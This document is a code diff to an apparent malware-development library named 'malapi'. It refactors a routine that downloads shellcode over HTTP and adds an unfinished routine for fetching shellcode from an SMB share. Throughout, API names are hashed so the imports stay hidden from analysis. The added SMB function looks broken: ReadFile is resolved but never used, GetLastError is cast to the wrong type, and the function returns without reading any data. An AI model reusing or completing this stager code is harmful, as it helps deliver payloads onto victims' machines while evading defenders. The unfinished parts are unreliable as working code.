@@ -433,8 +433,6 @@ namespace malapi
 	BOOL StageShellcodeHttp(_In_ LPCWSTR base_url, _In_ LPCWSTR uri_path, _In_ BOOL ssl_enabled, _Out_ PBYTE* shellcode, _Out_ SIZE_T* shellcode_size)
 	{
 		BOOL success = FALSE;
-		HMODULE kernel32 = NULL;
-		HMODULE winhttp = NULL;
 		*shellcode = NULL;
 		*shellcode_size = 0;
 
@@ -450,16 +448,6 @@ namespace malapi
 
 #pragma region Imports
 
-		typeWinHttpOpen WinHttpOpenC = NULL;
-		typeWinHttpConnect WinHttpConnectC = NULL;
-		typeWinHttpSendRequest WinHttpSendRequestC = NULL;
-		typeWinHttpOpenRequest WinHttpOpenRequestC = NULL;
-		typeWinHttpReceiveResponse WinHttpReceiveResponseC = NULL;
-		typeWinHttpReadData WinHttpReadDataC = NULL;
-		typeWinHttpCloseHandle WinHttpCloseHandleC = NULL;
-
-		typeGetLastError GetLastErrorC = NULL;
-
 		constexpr ULONG hash_kernel32 = HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
 		constexpr ULONG hash_getlasterror = HashStringFowlerNollVoVariant1a("GetLastError");
 
@@ -471,23 +459,22 @@ namespace malapi
 		constexpr ULONG hash_winhttpreaddata = HashStringFowlerNollVoVariant1a("WinHttpReadData");
 		constexpr ULONG hash_winhttpclosehandle = HashStringFowlerNollVoVariant1a("WinHttpCloseHandle");
 
-		kernel32 = GetModuleHandleC(hash_kernel32);
-
-		winhttp = LoadLibraryC("Winhttp.dll");
+		HMODULE kernel32 = GetModuleHandleC(hash_kernel32);
+		HMODULE winhttp = LoadLibraryC("Winhttp.dll");
 		//PDARKMODULE winhttp_dll = DarkLoadLibrary(LOAD_LOCAL_FILE, L"C:\\Windows\\System32\\winhttp.dll", NULL, 0, NULL);
 		//winhttp = (HMODULE)winhttp_dll->ModuleBase;
 
-		if (!kernel32 || !winhttp) goto CLEANUP;
+		if (!kernel32 || !winhttp) return FALSE;
 
-		WinHttpOpenC = (typeWinHttpOpen)GetProcAddressC(winhttp, hash_winhttpopen);
-		WinHttpConnectC = (typeWinHttpConnect)GetProcAddressC(winhttp, hash_winhttpconnect);
-		WinHttpSendRequestC = (typeWinHttpSendRequest)GetProcAddressC(winhttp, hash_winhttpsendrequest);
-		WinHttpOpenRequestC = (typeWinHttpOpenRequest)GetProcAddressC(winhttp, hash_winhttpopenrequest);
-		WinHttpReceiveResponseC = (typeWinHttpReceiveResponse)GetProcAddressC(winhttp, hash_winhttpreceiveresponse);
-		WinHttpReadDataC = (typeWinHttpReadData)GetProcAddressC(winhttp, hash_winhttpreaddata);
-		WinHttpCloseHandleC = (typeWinHttpCloseHandle)GetProcAddressC(winhttp, hash_winhttpclosehandle);
+		typeWinHttpOpen WinHttpOpenC = (typeWinHttpOpen)GetProcAddressC(winhttp, hash_winhttpopen);
+		typeWinHttpConnect WinHttpConnectC = (typeWinHttpConnect)GetProcAddressC(winhttp, hash_winhttpconnect);
+		typeWinHttpSendRequest WinHttpSendRequestC = (typeWinHttpSendRequest)GetProcAddressC(winhttp, hash_winhttpsendrequest);
+		typeWinHttpOpenRequest WinHttpOpenRequestC = (typeWinHttpOpenRequest)GetProcAddressC(winhttp, hash_winhttpopenrequest);
+		typeWinHttpReceiveResponse WinHttpReceiveResponseC = (typeWinHttpReceiveResponse)GetProcAddressC(winhttp, hash_winhttpreceiveresponse);
+		typeWinHttpReadData WinHttpReadDataC = (typeWinHttpReadData)GetProcAddressC(winhttp, hash_winhttpreaddata);
+		typeWinHttpCloseHandle WinHttpCloseHandleC = (typeWinHttpCloseHandle)GetProcAddressC(winhttp, hash_winhttpclosehandle);
 
-		GetLastErrorC = (typeGetLastError)GetProcAddressC(kernel32, hash_getlasterror);
+		typeGetLastError GetLastErrorC = (typeGetLastError)GetProcAddressC(kernel32, hash_getlasterror);
 
 #pragma endregion
 
@@ -582,6 +569,62 @@ namespace malapi
 		if (session) WinHttpCloseHandleC(session);
 		if (connect) WinHttpCloseHandleC(connect);
 		if (request) WinHttpCloseHandleC(request);
+		return success;
+	}
+
+	//
+	// Read shellcode from an SMB share
+	// Returns TRUE on success
+	//
+	BOOL StageShellcodeSmb(_In_ LPSTR remote_name, _In_ LPSTR local_name, _In_opt_ LPCSTR username, _In_opt_ LPCSTR password, _Out_ PBYTE* shellcode, _Out_ SIZE_T* shellcode_size)
+	{
+		BOOL success = FALSE;
+		DWORD return_value = 0;
+		NETRESOURCEA nr = { 0 };
+		DWORD flags = (CONNECT_TEMPORARY | CONNECT_REDIRECT);
+
+		*shellcode = nullptr;
+		*shellcode_size = 0;
+
+#pragma region Imports
+
+		constexpr ULONG hash_kernel32 = HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
+		constexpr ULONG hash_getlasterror = HashStringFowlerNollVoVariant1a("GetLastError");
+		constexpr ULONG hash_readfile = HashStringFowlerNollVoVariant1a("ReadFile");
+		constexpr ULONG hash_WNetAddConnection2A = HashStringFowlerNollVoVariant1a("WNetAddConnection2A");
+		constexpr ULONG hash_WNetCancelConnection2A = HashStringFowlerNollVoVariant1a("WNetCancelConnection2A");
+		constexpr ULONG hash_WNetGetLastErrorA = HashStringFowlerNollVoVariant1a("WNetGetLastErrorA");
+
+		HMODULE kernel32 = GetModuleHandleC(hash_kernel32);
+		HMODULE mpr = LoadLibraryC("Mpr.dll");
+
+		if (!kernel32 || !mpr) return FALSE;
+
+		typeReadFile ReadFile = (typeReadFile)GetProcAddressC(kernel32, hash_readfile);
+		typeReadFile GetLastError = (typeReadFile)GetProcAddressC(kernel32, hash_getlasterror);
+		typeWNetAddConnection2A WNetAddConnection2A = (typeWNetAddConnection2A)GetProcAddressC(mpr, hash_WNetAddConnection2A);
+		typeWNetCancelConnection2A WNetCancelConnection2A = (typeWNetCancelConnection2A)GetProcAddressC(mpr, hash_WNetCancelConnection2A);
+		typeWNetGetLastErrorA WNetGetLastErrorA = (typeWNetGetLastErrorA)GetProcAddressC(mpr, hash_WNetGetLastErrorA);
+
+#pragma endregion
+
+		ZeroMemoryEx(&nr, sizeof(NETRESOURCEA));
+
+		nr.dwType = RESOURCETYPE_DISK;
+		nr.lpRemoteName = remote_name;
+		nr.lpLocalName = local_name;
+		nr.lpProvider = NULL;
+
+		return_value = WNetAddConnection2A(&nr, password, username, flags);
+		if (return_value != NO_ERROR)
+		{
+			LOG_ERROR("Unable to connect to share. (Code: %u)", return_value);
+			return success;
+		}
+
+	CLEANUP:
+		WNetCancelConnection2A(local_name, flags, TRUE);
+		WNetCancelConnection2A(remote_name, flags, TRUE);
 		return success;
 	}
 
